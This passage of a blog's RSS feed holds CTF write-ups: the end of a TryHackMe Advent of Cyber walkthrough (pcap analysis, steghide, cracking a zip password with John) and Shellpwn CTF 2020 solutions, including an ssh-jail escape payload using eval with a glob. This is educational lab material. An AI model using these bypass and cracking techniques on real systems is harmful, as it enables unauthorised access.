&lt;p&gt;&lt;img src=&quot;images/thm_advent/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;lets check the oldest snapshot of the website we get the answers to other to question by viewing the oldest version of this website&lt;/p&gt;

&lt;h2 id=&quot;day6task-11&quot;&gt;Day6(Task 11)&lt;/h2&gt;
&lt;p&gt;We are given a pcap file and asked some questions about the data in the pcap&lt;/p&gt;

&lt;h3 id=&quot;ques-1-1&quot;&gt;ques 1&lt;/h3&gt;

&lt;p&gt;here on following through the udp  streams we get a a string that seems to encoded so we decode it to get the answer&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ques-2-1&quot;&gt;ques 2&lt;/h3&gt;

&lt;p&gt;Looking through the http request we see that there is a zip file and a jpeg image so we export them from wireshark&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can use &lt;strong&gt;steghide&lt;/strong&gt; with empty password to get the data from jpeg file&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;steghide extract &lt;span class=&quot;nt&quot;&gt;-sf&lt;/span&gt; TryHackMe.jpeg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;ques-3-1&quot;&gt;ques 3&lt;/h3&gt;

&lt;p&gt;we can use &lt;strong&gt;John&lt;/strong&gt; to crack the password of zip file&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zip2john christmaslists.zip &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash
&lt;/span&gt;john &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
                <pubDate>Wed, 04 Mar 2020 00:00:00 +0530</pubDate>
                <link>http://localhost:8000/Try-Hack-Me-Advent-Of-Cyber-Day1_to_Day6</link>
                <guid isPermaLink="true">http://localhost:8000/Try-Hack-Me-Advent-Of-Cyber-Day1_to_Day6</guid>
                
                <category>TryHackMe</category>
                
                <category>Advent_Of_Cyber</category>
                
                
            </item>
        
            <item>
                <title>Shellpwn CTF 2020 Writup</title>
                <description>&lt;!--more--&gt;
&lt;h1 id=&quot;shellpwn2020&quot;&gt;Shellpwn2020&lt;/h1&gt;

&lt;p&gt;So I was able to solve only 7 challenges in the ctf and all the challenges were very intersting ,so lets start with the forensics challenges&lt;/p&gt;

&lt;h2 id=&quot;forensics&quot;&gt;Forensics&lt;/h2&gt;
&lt;h3 id=&quot;challenge-hidden200&quot;&gt;Challenge-Hidden!,200&lt;/h3&gt;

&lt;p&gt;So we are given a file which is a 7z archive so we extract it and as the challenge name suggest &lt;em&gt;hidden&lt;/em&gt; we look for hidden files in the extracted data and we get a .flag.txt file so we read it and get the flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/shellpwnctf/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the flag is:-
&lt;code class=&quot;highlighter-rouge&quot;&gt;shellctf{l00k_d3ep_1n_b1n@rY}&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;challenge-find-me200&quot;&gt;Challenge-Find me!,200&lt;/h3&gt;

&lt;p&gt;The xml file give is a kml file which is used to save the google earth configurations ,so on loading up the xml file in google cloud we get the flag
&lt;img src=&quot;images/shellpwnctf/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the flag was right there but there was confusion in chars so i faced a lot of time trying out the combinations&lt;/p&gt;

&lt;p&gt;finally the flag was
&lt;code class=&quot;highlighter-rouge&quot;&gt;shellctf{2E501L}&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;scripting&quot;&gt;Scripting&lt;/h2&gt;

&lt;h3 id=&quot;zipppppy200&quot;&gt;Zipppppy,200&lt;/h3&gt;
&lt;p&gt;we are given with a file which is to extracted multiple times but the catch here is that everytime the file type is not same its different so we need to write a script to unzip it 
I wrote a bash script as its short and easy&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;INPUT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;FTYPE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;file &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;INPUT&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$FTYPE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POSIX tar&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;TAR&quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xOvf&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$INPUT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; tmp
    &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;tmp &lt;span class=&quot;nv&quot;&gt;$INPUT&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$FTYPE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Zip archive data&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ZIP&quot;&lt;/span&gt;
    unzip &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$INPUT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$FTYPE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bzip2 compressed&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ZIP&quot;&lt;/span&gt;
    bzcat &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$INPUT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; tmp
    &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;tmp &lt;span class=&quot;nv&quot;&gt;$INPUT&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$FTYPE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gzip compressed data&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ZIP&quot;&lt;/span&gt;
    zcat &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$INPUT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; tmp
    &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;tmp &lt;span class=&quot;nv&quot;&gt;$INPUT&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$FTYPE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;XZ compressed data&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ZIP&quot;&lt;/span&gt;
    xzcat &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$INPUT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; tmp
    &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;tmp &lt;span class=&quot;nv&quot;&gt;$INPUT&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$FTYPE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;7-zip archive data&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;7ZIP&quot;&lt;/span&gt;
    7z e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$INPUT&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;else
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;NOT RECOGNIZED&quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;FTYPE&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;and the run it like&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; ./unpack.sh flag&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;SO the flag is
&lt;code class=&quot;highlighter-rouge&quot;&gt;shellctf{$cr1ptiNg_I$_fUn}&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;fasst250&quot;&gt;Fasst,250&lt;/h3&gt;

&lt;p&gt;Here we just have to send the md5 hash of the strings provided by the server so I writup a quick python script to get the flag&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;134.209.149.171&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Y&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;		
	&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and we get the flag which is
&lt;code class=&quot;highlighter-rouge&quot;&gt;shellctf{y0u_c@Ught_m3}&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;can-you-escape-me350&quot;&gt;Can you Escape me!,350&lt;/h3&gt;

&lt;p&gt;so being honest i was not able to solve the chall within the ctf period but after the ctf was over i was able to solve it with a little help from a friend so it was basically a ssh jail where some keywords or letters were restricted but when i kept on trying i saw that the command &lt;em&gt;uniq&lt;/em&gt; was allowed but &lt;em&gt;flag.txt&lt;/em&gt; was blacklisted 
easy way to get past this was to use &lt;em&gt;uniq flag.[a-z][a-z][a-z]&lt;/em&gt;
it was showing command executed but i was not able to get the flag so i tried many things but it didn’t work so with the help of a friend he told that the catch was to simply eval it :(&lt;/p&gt;

&lt;p&gt;so the final payload was
&lt;code class=&quot;highlighter-rouge&quot;&gt;eval `uniq flag.[a-z][a-z][a-z]`&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/shellpwnctf/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the flag is
&lt;code class=&quot;highlighter-rouge&quot;&gt;shellctf{b@$h_1s_$0_much_fUn}&lt;/code&gt;&lt;/p&gt;

&lt;h5 id=&quot;thanks-rudrapratap-for-the-help&quot;&gt;Thanks @RudraPratap for the help&lt;/h5&gt;

&lt;h2 id=&quot;crypto&quot;&gt;Crypto&lt;/h2&gt;

&lt;h3 id=&quot;powerbase100&quot;&gt;Powerbase,100&lt;/h3&gt;

&lt;p&gt;So basically we are given a multiple times base64 string we just have to decode it&lt;/p&gt;

&lt;p&gt;which can done using a python script like this one&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;base_64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;base_64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;the flag is
&lt;code class=&quot;highlighter-rouge&quot;&gt;shellpwn{enc0ding_i$_n0t_encrYpt1ng}&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;seive-150&quot;&gt;Seive ,150&lt;/h3&gt;

&lt;p&gt;Its just a simple RSA problem which can be done using online tools or by solving manually ,I used a tool developed by my friend 
the link to the repo is &lt;a href=&quot;https://github.com/Masrt200/WoC2k19&quot;&gt;https://github.com/Masrt200/WoC2k19&lt;/a&gt;Plz do check it out&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/shellpwnctf/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The flag is
&lt;code class=&quot;highlighter-rouge&quot;&gt;shellctf{k3y_s1ze_m@tter$}&lt;/code&gt;&lt;/p&gt;
</description>
                <pubDate>Sat, 29 Feb 2020 00:00:00 +0530</pubDate>
                <link>http://localhost:8000/ShellpwnCTF-2020</link>
                <guid isPermaLink="true">http://localhost:8000/ShellpwnCTF-2020</guid>
                
                <category>CTF</category>
                
                <category>Forensics</category>
                
                <category>Scripting</category>
                
                <category>Crypto</category>
                
                
            </item>
        
    </channel>
</rss>